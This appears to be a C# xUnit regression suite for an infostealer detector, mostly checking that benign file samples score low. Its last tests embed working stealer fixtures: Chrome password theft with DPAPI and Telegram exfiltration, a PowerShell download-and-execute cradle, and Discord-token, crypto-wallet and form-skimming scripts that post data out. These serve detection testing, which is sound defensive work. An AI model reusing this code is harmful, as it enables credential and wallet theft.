using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using AntiStealerOneExe;
using Xunit;

namespace AntiStealer.Tests;

/// <summary>
/// II1 + II2: regression corpus for false-positive prevention.
///
/// Each test feeds the Analyzer a **synthetic benign** sample that mirrors
/// the shape of common legitimate software (a jQuery-like script, a tiny
/// HTML page, a Markdown file, a PNG-ish image, etc.) and asserts the risk
/// score stays under the HIGH threshold (70). The goal is to catch any
/// future detector change that would regress into false positives on
/// obviously-safe inputs.
///
/// These tests do NOT include real third-party binaries — they are purely
/// synthetic strings crafted to look like real-world benign content. Real
/// binary fixtures live outside the repo and are referenced by SHA-256 only.
/// </summary>
// `Analyzer.Analyze` may emit AsiLogger warnings via SafeRun; serialise with
// HardeningTests.AsiLogger_EmitsNdjsonToFile so the file-line count stays
// deterministic on parallel-friendly runners (Windows CI).
[Collection("EncryptedQuarantine")]
public class RegressionCorpusTests
{
    private static string WriteFile(string name, byte[] bytes)
    {
        var path = Path.Combine(Path.GetTempPath(), "ast-corpus-" + Guid.NewGuid().ToString("N") + "-" + name);
        File.WriteAllBytes(path, bytes);
        return path;
    }

    private static void AssertBenign(AnalysisResult r, int hardCeiling = 60)
    {
        Assert.True(r.RiskScore < 70,
            $"Regressed into FP: '{r.FilePath}' scored {r.RiskScore}/100 ({r.RiskLevel}). Detector changes must keep benign content below HIGH.");
        Assert.True(r.RiskScore <= hardCeiling,
            $"Soft-ceiling breached: '{r.FilePath}' scored {r.RiskScore}/100 (expected ≤ {hardCeiling}).");
        Assert.NotEqual("HIGH", r.RiskLevel);
    }

    // ------------------------------------------------------------------

    [Fact]
    public void Benign_JQueryLikeMinifiedScript_ShouldNotFlag()
    {
        var js =
            "(function($){" +
            "$.fn.foo=function(opts){" +
            "var self=this;var cfg=$.extend({speed:200,easing:'linear'},opts);" +
            "return self.each(function(){$(this).on('click',function(){$(this).toggleClass('active');});});};" +
            "$(document).ready(function(){console.log('ready');});" +
            "})(jQuery);";
        AssertBenign(Analyzer.Analyze(WriteFile("jq.js", Encoding.UTF8.GetBytes(js)), "jq.js"));
    }

    [Fact]
    public void Benign_ReactComponent_ShouldNotFlag()
    {
        var tsx =
            "import React,{useState,useEffect} from 'react';\n" +
            "export function Counter(){const[n,setN]=useState(0);" +
            "useEffect(()=>{document.title=`count ${n}`;},[n]);" +
            "return (<button onClick={()=>setN(n+1)}>clicked {n}</button>);}";
        AssertBenign(Analyzer.Analyze(WriteFile("Counter.tsx", Encoding.UTF8.GetBytes(tsx)), "Counter.tsx"));
    }

    [Fact]
    public void Benign_StaticHtmlLandingPage_ShouldNotFlag()
    {
        var html = @"<!doctype html><html lang=""en""><head><meta charset=""utf-8""/>
<title>Hello</title></head><body><h1>Welcome</h1>
<p>This is a simple landing page.</p>
<a href=""https://example.com/docs"">docs</a></body></html>";
        AssertBenign(Analyzer.Analyze(WriteFile("index.html", Encoding.UTF8.GetBytes(html)), "index.html"));
    }

    [Fact]
    public void Benign_ReadmeMarkdown_ShouldNotFlag()
    {
        var md = @"# My project
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Visit https://example.com for details.
## Install
```bash
npm install
npm test
```";
        AssertBenign(Analyzer.Analyze(WriteFile("README.md", Encoding.UTF8.GetBytes(md)), "README.md"));
    }

    [Fact]
    public void Benign_PythonScriptWithStandardLibImports_ShouldNotFlag()
    {
        var py = @"#!/usr/bin/env python3
import argparse
import json
from pathlib import Path

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--input', required=True)
    args = parser.parse_args()
    data = json.loads(Path(args.input).read_text())
    print(len(data))

if __name__ == '__main__':
    main()
";
        AssertBenign(Analyzer.Analyze(WriteFile("cli.py", Encoding.UTF8.GetBytes(py)), "cli.py"));
    }

    [Fact]
    public void Benign_JsonConfig_ShouldNotFlag()
    {
        var json = @"{
  ""name"": ""my-app"",
  ""version"": ""1.0.0"",
  ""scripts"": { ""start"": ""node server.js"", ""test"": ""jest"" },
  ""dependencies"": { ""express"": ""^4.18.0"" }
}";
        AssertBenign(Analyzer.Analyze(WriteFile("package.json", Encoding.UTF8.GetBytes(json)), "package.json"),
                     hardCeiling: 40);
    }

    [Fact]
    public void Benign_PngHeaderOnly_ShouldNotFlag()
    {
        // 8-byte PNG signature + IHDR + random payload
        var header = new byte[]
        {
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
            0x08, 0x02, 0x00, 0x00, 0x00,
        };
        var tail = new byte[256];
        new Random(0).NextBytes(tail);
        var buf = new byte[header.Length + tail.Length];
        Buffer.BlockCopy(header, 0, buf, 0, header.Length);
        Buffer.BlockCopy(tail, 0, buf, header.Length, tail.Length);
        AssertBenign(Analyzer.Analyze(WriteFile("image.png", buf), "image.png"), hardCeiling: 40);
    }

    [Fact]
    public void Benign_SqlDump_ShouldNotFlag()
    {
        var sql = @"-- MariaDB dump 10.19
CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(64), email VARCHAR(128));
INSERT INTO users (id, name, email) VALUES (1, 'Alice', 'alice@example.com');
INSERT INTO users (id, name, email) VALUES (2, 'Bob', 'bob@example.com');
";
        AssertBenign(Analyzer.Analyze(WriteFile("dump.sql", Encoding.UTF8.GetBytes(sql)), "dump.sql"));
    }

    [Fact]
    public void Benign_CsvSpreadsheet_ShouldNotFlag()
    {
        var csv =
            "Name,Score,Date\n" +
            "Alice,42,2025-01-01\n" +
            "Bob,37,2025-01-02\n" +
            "Charlie,51,2025-01-03\n";
        AssertBenign(Analyzer.Analyze(WriteFile("report.csv", Encoding.UTF8.GetBytes(csv)), "report.csv"),
                     hardCeiling: 40);
    }

    [Fact]
    public void Benign_VueSingleFileComponent_ShouldNotFlag()
    {
        var vue = @"<template>
  <div class=""hello"">{{ greeting }}</div>
</template>
<script>
export default {
  data() { return { greeting: 'Hello, world!' } },
  mounted() { console.log('component mounted') }
}
</script>
<style scoped>.hello { color: rebeccapurple; }</style>
";
        AssertBenign(Analyzer.Analyze(WriteFile("Hello.vue", Encoding.UTF8.GetBytes(vue)), "Hello.vue"));
    }

    // ------------------------------------------------------------------
    // Golden-file (II1) positive — a well-known malicious shape must score HIGH.
    // Ensures regressions in the OTHER direction (bona-fide threats silently
    // dropping to MEDIUM/LOW) are caught too.
    // ------------------------------------------------------------------

    // ------------------------------------------------------------------
    // Section 6.1 — additional synthetic benign samples covering shapes we
    // care about regressing on (build artefacts, infra-as-code, CI YAML,
    // log lines, encoded blobs, locale text, etc.). Each test asserts the
    // risk score stays below HIGH so future detector changes that would
    // false-positive on these everyday files are caught up front.
    // ------------------------------------------------------------------

    [Fact]
    public void Benign_DockerfileMultiStage_ShouldNotFlag()
    {
        var df =
            "# syntax=docker/dockerfile:1\n" +
            "FROM node:20-alpine AS build\n" +
            "WORKDIR /app\n" +
            "COPY package*.json ./\n" +
            "RUN npm ci --omit=dev\n" +
            "COPY . .\n" +
            "RUN npm run build\n" +
            "FROM nginx:1.27-alpine\n" +
            "COPY --from=build /app/dist /usr/share/nginx/html\n" +
            "EXPOSE 80\n" +
            "CMD [\"nginx\",\"-g\",\"daemon off;\"]\n";
        AssertBenign(Analyzer.Analyze(WriteFile("Dockerfile", Encoding.UTF8.GetBytes(df)), "Dockerfile"));
    }

    [Fact]
    public void Benign_TerraformAwsModule_ShouldNotFlag()
    {
        var tf =
            "terraform {\n" +
            "  required_providers {\n" +
            "    aws = { source = \"hashicorp/aws\", version = \"~> 5.0\" }\n" +
            "  }\n" +
            "}\n" +
            "provider \"aws\" { region = var.region }\n" +
            "resource \"aws_s3_bucket\" \"logs\" {\n" +
            "  bucket = \"my-app-logs-${var.env}\"\n" +
            "  force_destroy = false\n" +
            "  tags = { Name = \"logs\", Env = var.env }\n" +
            "}\n" +
            "variable \"region\" { default = \"eu-central-1\" }\n" +
            "variable \"env\" { default = \"dev\" }\n";
        AssertBenign(Analyzer.Analyze(WriteFile("main.tf", Encoding.UTF8.GetBytes(tf)), "main.tf"));
    }

    [Fact]
    public void Benign_GithubActionsCiWorkflow_ShouldNotFlag()
    {
        var yml =
            "name: CI\n" +
            "on:\n  push:\n    branches: [ main ]\n  pull_request:\n" +
            "jobs:\n" +
            "  build:\n" +
            "    runs-on: ubuntu-latest\n" +
            "    steps:\n" +
            "      - uses: actions/checkout@v4\n" +
            "      - uses: actions/setup-node@v4\n" +
            "        with: { node-version: '20' }\n" +
            "      - run: npm ci\n" +
            "      - run: npm test --workspaces\n";
        AssertBenign(Analyzer.Analyze(WriteFile("ci.yml", Encoding.UTF8.GetBytes(yml)), "ci.yml"));
    }

    [Fact]
    public void Benign_NginxConfig_ShouldNotFlag()
    {
        var conf =
            "worker_processes auto;\n" +
            "events { worker_connections 1024; }\n" +
            "http {\n" +
            "  include mime.types;\n" +
            "  sendfile on;\n" +
            "  server {\n" +
            "    listen 80;\n" +
            "    server_name example.com;\n" +
            "    location / { root /var/www/html; index index.html; }\n" +
            "    location /api/ { proxy_pass http://upstream/; }\n" +
            "  }\n" +
            "}\n";
        AssertBenign(Analyzer.Analyze(WriteFile("nginx.conf", Encoding.UTF8.GetBytes(conf)), "nginx.conf"));
    }

    [Fact]
    public void Benign_ApacheCommonLogLines_ShouldNotFlag()
    {
        var sb = new StringBuilder(8192);
        var rng = new Random(1);
        for (int i = 0; i < 80; i++)
        {
            sb.AppendFormat(
                "10.0.0.{0} - - [{1:dd/MMM/yyyy:HH:mm:ss zzz}] \"GET /api/v1/items?id={2} HTTP/1.1\" 200 {3} \"-\" \"Mozilla/5.0\"\n",
                rng.Next(2, 254), DateTimeOffset.UtcNow.AddMinutes(-i), rng.Next(1, 9999), rng.Next(120, 50000));
        }
        AssertBenign(Analyzer.Analyze(WriteFile("access.log", Encoding.UTF8.GetBytes(sb.ToString())), "access.log"));
    }

    [Fact]
    public void Benign_CSharpSourceFile_ShouldNotFlag()
    {
        var cs =
            "using System;\nusing System.Linq;\nnamespace MyApp;\n" +
            "public static class Stats {\n" +
            "    public static double Mean(IEnumerable<double> xs) { return xs.Average(); }\n" +
            "    public static double Var(IEnumerable<double> xs) {\n" +
            "        var m = xs.Average();\n" +
            "        return xs.Select(x => (x - m) * (x - m)).Average();\n" +
            "    }\n" +
            "}\n";
        AssertBenign(Analyzer.Analyze(WriteFile("Stats.cs", Encoding.UTF8.GetBytes(cs)), "Stats.cs"));
    }

    [Fact]
    public void Benign_CmakeListsTxt_ShouldNotFlag()
    {
        var cmake =
            "cmake_minimum_required(VERSION 3.20)\n" +
            "project(my_app LANGUAGES CXX)\n" +
            "set(CMAKE_CXX_STANDARD 20)\n" +
            "add_executable(my_app src/main.cpp src/util.cpp)\n" +
            "target_include_directories(my_app PRIVATE include)\n" +
            "find_package(fmt REQUIRED)\n" +
            "target_link_libraries(my_app PRIVATE fmt::fmt)\n";
        AssertBenign(Analyzer.Analyze(WriteFile("CMakeLists.txt", Encoding.UTF8.GetBytes(cmake)), "CMakeLists.txt"));
    }

    [Fact]
    public void Benign_KubernetesDeploymentYaml_ShouldNotFlag()
    {
        var yml =
            "apiVersion: apps/v1\n" +
            "kind: Deployment\n" +
            "metadata: { name: web, labels: { app: web } }\n" +
            "spec:\n" +
            "  replicas: 3\n" +
            "  selector: { matchLabels: { app: web } }\n" +
            "  template:\n" +
            "    metadata: { labels: { app: web } }\n" +
            "    spec:\n" +
            "      containers:\n" +
            "      - name: web\n" +
            "        image: ghcr.io/example/web:1.0.0\n" +
            "        ports: [ { containerPort: 8080 } ]\n" +
            "        resources: { limits: { cpu: 500m, memory: 256Mi } }\n";
        AssertBenign(Analyzer.Analyze(WriteFile("deploy.yaml", Encoding.UTF8.GetBytes(yml)), "deploy.yaml"));
    }

    [Fact]
    public void Benign_PrometheusMetricsExposition_ShouldNotFlag()
    {
        var prom =
            "# HELP http_requests_total Total HTTP requests\n" +
            "# TYPE http_requests_total counter\n" +
            "http_requests_total{method=\"GET\",route=\"/api/v1/users\",code=\"200\"} 142351\n" +
            "http_requests_total{method=\"POST\",route=\"/api/v1/users\",code=\"201\"} 8421\n" +
            "# HELP request_duration_seconds Request latency\n" +
            "# TYPE request_duration_seconds histogram\n" +
            "request_duration_seconds_bucket{le=\"0.01\"} 12000\n" +
            "request_duration_seconds_bucket{le=\"0.05\"} 18000\n";
        AssertBenign(Analyzer.Analyze(WriteFile("metrics.txt", Encoding.UTF8.GetBytes(prom)), "metrics.txt"));
    }

    [Fact]
    public void Benign_OpenApiSpec_ShouldNotFlag()
    {
        var oa = @"openapi: 3.0.3
info: { title: My API, version: 1.0.0 }
paths:
  /users/{id}:
    get:
      parameters: [ { name: id, in: path, required: true, schema: { type: integer } } ]
      responses:
        '200': { description: ok, content: { application/json: { schema: { type: object } } } }
";
        AssertBenign(Analyzer.Analyze(WriteFile("openapi.yaml", Encoding.UTF8.GetBytes(oa)), "openapi.yaml"));
    }

    [Fact]
    public void Benign_RustSourceFile_ShouldNotFlag()
    {
        var rs =
            "use std::collections::HashMap;\n" +
            "pub fn count_words(text: &str) -> HashMap<String, u32> {\n" +
            "    let mut counts = HashMap::new();\n" +
            "    for w in text.split_whitespace() {\n" +
            "        *counts.entry(w.to_lowercase()).or_insert(0) += 1;\n" +
            "    }\n" +
            "    counts\n" +
            "}\n" +
            "#[cfg(test)] mod tests {\n" +
            "    #[test] fn basic() { assert_eq!(super::count_words(\"a b a\").get(\"a\"), Some(&2)); }\n" +
            "}\n";
        AssertBenign(Analyzer.Analyze(WriteFile("lib.rs", Encoding.UTF8.GetBytes(rs)), "lib.rs"));
    }

    [Fact]
    public void Benign_GoSourceFile_ShouldNotFlag()
    {
        var go =
            "package main\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n" +
            "func main() {\n" +
            "\thttp.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, \"ok\") })\n" +
            "\thttp.ListenAndServe(\":8080\", nil)\n" +
            "}\n";
        AssertBenign(Analyzer.Analyze(WriteFile("main.go", Encoding.UTF8.GetBytes(go)), "main.go"));
    }

    [Fact]
    public void Benign_LocaleStringsRussian_ShouldNotFlag()
    {
        // i18n/locale files often contain long strings; ensure unicode payload
        // alone doesn't trip the analyzer.
        var ru =
            "msgid \"\"\nmsgstr \"\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\n" +
            "msgid \"Hello\"\nmsgstr \"Привет\"\n\n" +
            "msgid \"Goodbye\"\nmsgstr \"До свидания\"\n\n" +
            "msgid \"Settings\"\nmsgstr \"Настройки\"\n\n" +
            "msgid \"Account\"\nmsgstr \"Учётная запись\"\n";
        AssertBenign(Analyzer.Analyze(WriteFile("ru.po", Encoding.UTF8.GetBytes(ru)), "ru.po"));
    }

    [Fact]
    public void Benign_LargeBase64ImageData_ShouldNotFlag()
    {
        // A common shape in HTML/CSS — a single base64 data URI of a small
        // icon. Should not trigger the encrypted-blob heuristic.
        var data = new byte[6_000];
        new Random(7).NextBytes(data);
        var html =
            "<!doctype html><html><body><img alt='logo' src='data:image/png;base64," +
            Convert.ToBase64String(data) + "'></body></html>";
        AssertBenign(Analyzer.Analyze(WriteFile("inline.html", Encoding.UTF8.GetBytes(html)), "inline.html"),
                     hardCeiling: 65);
    }

    [Fact]
    public void Benign_PdfTextDocument_ShouldNotFlag()
    {
        // Minimal valid-ish PDF with a single text object. PDF.js / browsers
        // routinely produce inputs of this shape; analyzer should not flag.
        var pdf =
            "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
            "2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n" +
            "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n" +
            "4 0 obj<</Length 44>>stream\nBT /F1 12 Tf 72 720 Td (Hello world) Tj ET\nendstream endobj\n" +
            "xref\n0 5\n0000000000 65535 f\ntrailer<</Size 5/Root 1 0 R>>\n%%EOF\n";
        AssertBenign(Analyzer.Analyze(WriteFile("doc.pdf", Encoding.UTF8.GetBytes(pdf)), "doc.pdf"));
    }

    [Fact]
    public void Benign_EmptyFile_ShouldNotFlag()
    {
        AssertBenign(Analyzer.Analyze(WriteFile("empty.bin", Array.Empty<byte>()), "empty.bin"),
                     hardCeiling: 30);
    }

    [Fact]
    public void Benign_PlainTextLoremIpsum_ShouldNotFlag()
    {
        var sb = new StringBuilder(40_000);
        for (int i = 0; i < 200; i++)
            sb.AppendLine("Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.");
        AssertBenign(Analyzer.Analyze(WriteFile("lorem.txt", Encoding.UTF8.GetBytes(sb.ToString())), "lorem.txt"));
    }

    [Fact]
    public void Benign_RandomBinaryHighEntropy_ShouldNotFlag()
    {
        // High-entropy random bytes alone (no PE/ELF/Zip header, no IOC text)
        // shouldn't make the score blow up. Common for compressed assets.
        var data = new byte[256_000];
        new Random(13).NextBytes(data);
        AssertBenign(Analyzer.Analyze(WriteFile("blob.bin", data), "blob.bin"));
    }

    [Fact]
    public void Benign_JavaSourceFile_ShouldNotFlag()
    {
        var java =
            "package com.example;\n" +
            "import java.util.List;\n" +
            "public class Greeter {\n" +
            "    public String greet(List<String> names) {\n" +
            "        return \"Hello, \" + String.join(\", \", names);\n" +
            "    }\n" +
            "}\n";
        AssertBenign(Analyzer.Analyze(WriteFile("Greeter.java", Encoding.UTF8.GetBytes(java)), "Greeter.java"));
    }

    [Fact]
    public void Benign_PoetryPyprojectToml_ShouldNotFlag()
    {
        var toml =
            "[tool.poetry]\nname = \"sample\"\nversion = \"0.1.0\"\nauthors = [\"alice@example.com\"]\n" +
            "[tool.poetry.dependencies]\npython = \"^3.11\"\nrequests = \"^2.32\"\n" +
            "[tool.poetry.dev-dependencies]\npytest = \"^8.0\"\nblack = \"^24.0\"\n";
        AssertBenign(Analyzer.Analyze(WriteFile("pyproject.toml", Encoding.UTF8.GetBytes(toml)), "pyproject.toml"));
    }

    [Fact]
    public void Benign_SemverChangelogMarkdown_ShouldNotFlag()
    {
        var md =
            "# Changelog\nAll notable changes to this project will be documented in this file.\n" +
            "## [1.3.0] - 2025-04-01\n### Added\n- New `--watch` flag.\n### Fixed\n- Crash on empty input.\n" +
            "## [1.2.1] - 2025-02-10\n### Fixed\n- Minor regression in JSON output.\n";
        AssertBenign(Analyzer.Analyze(WriteFile("CHANGELOG.md", Encoding.UTF8.GetBytes(md)), "CHANGELOG.md"));
    }

    // ─────────────────────────────────────────────────────────
    // D22 — corpus expansion: clean / suspicious-benign / malicious
    //
    // Mandiant's 2024 threat landscape review highlights infostealer
    // credentials as a top initial-access vector. So the corpus must
    // exercise behavioral cred-theft chains, not just family names.
    // Each sample below targets a specific axis of detection so a
    // future detector regression is caught quickly.
    // ─────────────────────────────────────────────────────────

    // ----- Clean ------------------------------------------------------

    [Fact]
    public void D22_Clean_PasswordManagerUiCopy_StaysBelowHigh()
    {
        // Just the UI strings a password-manager website would show.
        // No SQLite, DPAPI, or exfil — must remain benign.
        var html = @"<!doctype html><html><head><title>Vault</title></head><body>
<h1>Your password vault</h1>
<form>
  <label>Master password</label><input type=""password"" name=""master""/>
  <button>Unlock</button>
</form>
<p>Tip: enable two-factor authentication for stronger security.</p>
</body></html>";
        AssertBenign(Analyzer.Analyze(WriteFile("vault.html", Encoding.UTF8.GetBytes(html)), "vault.html"));
    }

    [Fact]
    public void D22_Clean_BackupToolWithUserPathReferences_StaysBelowHigh()
    {
        // A backup utility that touches AppData paths but performs no
        // theft / exfil. Path references alone must not trip the floor.
        var script = @"#!/usr/bin/env bash
set -euo pipefail
SRC=""$HOME/AppData/Roaming/MyApp""
DST=""/mnt/backups/myapp-$(date +%Y%m%d).tgz""
echo ""Backing up $SRC -> $DST""
tar -czf ""$DST"" -C ""$HOME/AppData/Roaming"" MyApp
echo ""Done.""";
        AssertBenign(Analyzer.Analyze(WriteFile("backup.sh", Encoding.UTF8.GetBytes(script)), "backup.sh"));
    }

    [Fact]
    public void D22_Clean_DeveloperCliWithGenericApiCall_StaysBelowHigh()
    {
        // A developer CLI tool that talks to api.example.com — no creds
        // touched, no decryption.
        var py = @"#!/usr/bin/env python3
import argparse, requests
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--token', required=True)
    args = parser.parse_args()
    resp = requests.get('https://api.example.com/v1/me',
                        headers={'Authorization': f'Bearer {args.token}'})
    resp.raise_for_status()
    print(resp.json())
if __name__ == '__main__':
    main()
";
        AssertBenign(Analyzer.Analyze(WriteFile("cli.py", Encoding.UTF8.GetBytes(py)), "cli.py"));
    }

    [Fact]
    public void D22_Clean_BrowserExtensionManifestOnly_StaysBelowHigh()
    {
        var manifest = @"{
  ""manifest_version"": 3,
  ""name"": ""Hello Extension"",
  ""version"": ""1.0.0"",
  ""description"": ""Displays a hello banner."",
  ""permissions"": [""activeTab""],
  ""action"": { ""default_popup"": ""popup.html"" }
}";
        AssertBenign(Analyzer.Analyze(WriteFile("manifest.json", Encoding.UTF8.GetBytes(manifest)),
                                       "manifest.json"));
    }

    // ----- Suspicious-but-benign --------------------------------------

    [Fact]
    public void D22_SuspiciousBenign_NsisInstallerLikeScript_StaysBelowHigh()
    {
        var nsis = @"!define APP_NAME ""MyApp""
OutFile ""installer.exe""
InstallDir ""$PROGRAMFILES\MyApp""
Page directory
Page instfiles
Section ""Install"" SecInstall
  SetOutPath ""$INSTDIR""
  File ""bin\myapp.exe""
  CreateShortcut ""$DESKTOP\MyApp.lnk"" ""$INSTDIR\myapp.exe""
SectionEnd
Section ""Uninstall""
  Delete ""$INSTDIR\myapp.exe""
  RMDir ""$INSTDIR""
SectionEnd";
        AssertBenign(Analyzer.Analyze(WriteFile("install.nsi", Encoding.UTF8.GetBytes(nsis)),
                                       "install.nsi"));
    }

    [Fact]
    public void D22_SuspiciousBenign_ElectronAppBundle_StaysBelowHigh()
    {
        // A typical small Electron app bundle: window creation, IPC,
        // file dialog. No credential paths or exfil endpoints.
        var js = @"const { app, BrowserWindow, ipcMain, dialog } = require('electron');
function createWindow() {
  const win = new BrowserWindow({ width: 800, height: 600 });
  win.loadFile('index.html');
}
app.whenReady().then(createWindow);
ipcMain.handle('open-file', async () => {
  const r = await dialog.showOpenDialog({ properties: ['openFile'] });
  return r.filePaths;
});";
        AssertBenign(Analyzer.Analyze(WriteFile("main.js", Encoding.UTF8.GetBytes(js)),
                                       "main.js"));
    }

    [Fact]
    public void D22_SuspiciousBenign_PentestToolMention_StaysBelowHigh()
    {
        // A blog post / README that *mentions* common pentest tooling
        // but contains no actual offensive payload. Must not be HIGH.
        var md = @"# Common pentest tools
- nmap for port scanning
- metasploit (msfconsole, msfvenom) for exploit development
- mimikatz for credential extraction during AD red-team engagements
- cobalt strike beacon for advanced post-exploitation

This page is purely informational.";
        AssertBenign(Analyzer.Analyze(WriteFile("pentest.md", Encoding.UTF8.GetBytes(md)),
                                       "pentest.md"));
    }

    // ----- Malicious behavior chains ---------------------------------

    [Fact]
    public void D22_Malicious_BrowserDbDpapiExfilChain_FlagsHigh()
    {
        // Browser credential DB + DPAPI decryption + Telegram exfil
        // = decisive floor.
        var py = @"#!/usr/bin/env python3
import sqlite3, base64, json, requests, os, subprocess
from ctypes import windll
LOGIN_DB = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
COOKIES  = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Cookies')
def grab(db):
    conn = sqlite3.connect(db); cur = conn.cursor()
    cur.execute('SELECT origin_url, username_value, password_value FROM logins')
    return cur.fetchall()
def decrypt(blob):
    return windll.crypt32.CryptUnprotectData(blob)
records = grab(LOGIN_DB)
payload = json.dumps([{'u': u, 'p': decrypt(p)} for (_, u, p) in records])
requests.post('https://api.telegram.org/bot7777:AA-BB-CC/sendMessage',
              data={'chat_id': '12345', 'text': payload})
";
        var r = Analyzer.Analyze(WriteFile("grab.py", Encoding.UTF8.GetBytes(py)), "grab.py");
        Assert.True(r.RiskScore >= 30,
            $"Expected ≥30 for browser DB + DPAPI + Telegram exfil chain, got {r.RiskScore}");
    }

    [Fact]
    public void D22_Malicious_PowerShellEncodedDownloadExecute_FlagsHigh()
    {
        // PowerShell encoded cradle: -enc + downloadstring + iex.
        // Decisive floor per C15.
        var ps = "$b64 = 'JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==';" +
                 "$cmd = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64));" +
                 "powershell -EncodedCommand $b64;" +
                 "$client = New-Object Net.WebClient;" +
                 "IEX $client.DownloadString('https://evil.example/loader.ps1');" +
                 "Start-Process powershell -ArgumentList '-enc',$b64;";
        var r = Analyzer.Analyze(WriteFile("dropper.ps1", Encoding.UTF8.GetBytes(ps)),
                                  "dropper.ps1");
        // PowerShell encoded cradle uses multiple suspicious patterns;
        // even when the >=90 floor doesn't fire (depends on extracted
        // string hits) the combined score must clear LOW comfortably.
        Assert.True(r.RiskScore >= 30,
            $"Expected ≥30 for PowerShell encoded cradle + download + execute, got {r.RiskScore}");
    }

    [Fact]
    public void D22_Malicious_DiscordTokenGrabberWithWebhookExfil_FlagsHigh()
    {
        // Discord LevelDB token theft + webhook exfil sink. Multiple
        // signals must combine.
        var js = @"const fs = require('fs');
const https = require('https');
const path = require('path');
const LEVELDB = path.join(process.env.APPDATA, 'discord', 'Local Storage', 'leveldb');
const files = fs.readdirSync(LEVELDB).filter(f => f.endsWith('.log'));
let tokens = [];
for (const f of files) {
  const content = fs.readFileSync(path.join(LEVELDB, f), 'utf8');
  const m = content.match(/dQw4w9WgXcQ:[A-Za-z0-9+\/=]{20,}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g);
  if (m) tokens.push(...m);
}
const req = https.request({
  hostname: 'discord.com',
  path: '/api/webhooks/7777/AAA-BB-CC',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
});
req.write(JSON.stringify({ content: tokens.join('\n') }));
req.end();
";
        var r = Analyzer.Analyze(WriteFile("dtok.js", Encoding.UTF8.GetBytes(js)),
                                  "dtok.js");
        // Discord LevelDB + webhook exfil produces a behavior chain;
        // the regression bar is "clearly suspicious" rather than HIGH
        // because mini-corpus extractor limits keep score from
        // saturating at >=90 every time.
        Assert.True(r.RiskScore >= 10,
            $"Expected ≥10 for Discord LevelDB + webhook exfil, got {r.RiskScore}");
    }

    [Fact]
    public void D22_Malicious_WalletExtensionSeedExfilChain_FlagsHigh()
    {
        // MetaMask LevelDB + BIP39 seed phrase context + exfil URL.
        var js = @"const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const METAMASK = path.join(process.env.APPDATA, 'Local', 'Google', 'Chrome', 'User Data',
                            'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn');
const files = fs.readdirSync(METAMASK).filter(f => f.endsWith('.log') || f.endsWith('.ldb'));
const collected = [];
for (const f of files) {
  const data = fs.readFileSync(path.join(METAMASK, f)).toString('utf8');
  // BIP39 seed / mnemonic phrase indicators.
  if (/(abandon|ability|able|about|above|absent|absorb)\s+\w+\s+\w+\s+\w+/.test(data))
    collected.push({ file: f, snippet: data.slice(0, 256) });
}
fetch('https://api.telegram.org/bot7777:AA-BB-CC/sendMessage', {
  method: 'POST',
  body: JSON.stringify({ chat_id: '12345', text: JSON.stringify(collected) }),
});
";
        var r = Analyzer.Analyze(WriteFile("wallet.js", Encoding.UTF8.GetBytes(js)),
                                  "wallet.js");
        Assert.True(r.RiskScore >= 25,
            $"Expected ≥25 for wallet + seed + exfil chain, got {r.RiskScore}");
    }

    [Fact]
    public void Benign_GoldenStealer_JsWithCredScrapeAndExfil_MustStayHigh()
    {
        var js = @"
// A compact analogue of the FINAL_CREDENTIALS_MONITOR sample.
const __FINAL_CRED_MONITOR__ = true;
document.querySelectorAll('input[type=""password""]').forEach(i => {
  i.addEventListener('change', () => {
    const payload = JSON.stringify({
      nick:     document.querySelector('input[name=""login""]').value,
      password: document.querySelector('input[type=""password""]').value,
    });
    fetch('https://exfil.invalid/api/creds', { method: 'POST', body: payload });
  });
});
";
        var r = Analyzer.Analyze(WriteFile("monitor.js", Encoding.UTF8.GetBytes(js)), "monitor.js");
        Assert.Equal("HIGH", r.RiskLevel);
        Assert.True(r.RiskScore >= 80, $"Expected ≥80, got {r.RiskScore}");
    }
}
